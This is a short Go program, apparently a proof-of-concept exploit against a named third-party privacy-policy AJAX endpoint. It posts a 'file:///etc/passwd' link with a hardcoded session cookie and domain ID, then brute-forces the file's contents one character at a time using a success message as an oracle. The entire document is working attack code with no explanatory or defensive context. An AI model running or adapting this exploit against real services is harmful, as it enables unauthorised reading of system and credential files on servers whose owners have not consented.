package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func main() {
	const charset = "abcdefghijklmnopqrstuvwxyz" +
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
		"0123456789" +
		"\\.,_-:=/{}^ \"" +
		"\n"

	var baseStr string
	baseUrl := "https://svc.ezoic.com/apps/privacypolicy/ajax.php"
	remoteFile := "file:///etc/passwd"
	maxLen := 512

	if len(os.Args) > 2 {
		baseStr += os.Args[1]
		remoteFile = os.Args[2]
		fmt.Println("[*] Base search string: " + baseStr)
	}

	client := &http.Client{}
	data := url.Values{}
	data.Add("link", remoteFile)
	data.Add("action", "disable-privacy")
	data.Add("domainId", "165099")

	fmt.Println("[*] Starting brute force on: " + remoteFile)

	for i := 0; i < maxLen; i++ {
		for _, c := range charset {
			data.Set("privacyLink", baseStr+string(c))

			r, _ := http.NewRequest("POST", baseUrl, strings.NewReader(data.Encode()))
			r.Header.Set("Cookie", "PHPSESSID=too1gr9sbi61bun8cn1fp4i4f5")

			resp, _ := client.Do(r)
			defer resp.Body.Close()

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				fmt.Println(err)
			}

			bodyString := string(bodyBytes)
			if strings.Contains(bodyString, "Update successful!") {
				baseStr += string(c)
				fmt.Println("[*] FOUND: " + baseStr)
			}
		}
		if len(baseStr) < 1 {
			fmt.Println("[!] Didn't find anything. Quitting")
			return
		}
	}
}
